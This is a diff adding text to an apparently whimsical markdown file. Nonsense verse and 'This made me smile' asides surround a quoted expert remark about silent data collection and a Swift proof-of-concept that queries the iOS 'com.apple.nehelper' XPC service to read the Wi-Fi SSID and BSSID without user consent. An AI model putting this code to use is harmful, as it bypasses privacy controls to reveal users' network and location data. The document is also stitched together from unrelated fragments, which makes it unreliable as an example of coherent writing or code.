@@ -89,3 +89,27 @@ Fishy fishy, when i hold your tail, you start to stray away, or not, doesn't mak
 
 > ->This made me smile :-)  
 
+it's able to silently pull a *trove* of personal information without _any_ kind of user prompt  
+All this data was being collected and available to an attacker even if “Share analytics” was turned off in ***settings***.” states the expert.  
+```
+func wifi_info() -> String? {
+    let connection = xpc_connection_create_mach_service("com.apple.nehelper", nil, 2)
+    xpc_connection_set_event_handler(connection, { _ in })
+    xpc_connection_resume(connection)
+    let xdict = xpc_dictionary_create(nil, nil, 0)
+    xpc_dictionary_set_uint64(xdict, "delegate-class-id", 10)
+    xpc_dictionary_set_uint64(xdict, "sdk-version", 1) // may be omitted entirely
+    xpc_dictionary_set_string(xdict, "interface-name", "en0")
+    let reply = xpc_connection_send_message_with_reply_sync(connection, xdict)
+    if let result = xpc_dictionary_get_value(reply, "result-data") {
+        let ssid = String(cString: xpc_dictionary_get_string(result, "SSID"))
+        let bssid = String(cString: xpc_dictionary_get_string(result, "BSSID"))
+        return "SSID: \(ssid)\nBSSID: \(bssid)"
+    } else {
+        return nil
+    }
+}
+```
+
+> ->This made me smile :-)  
+
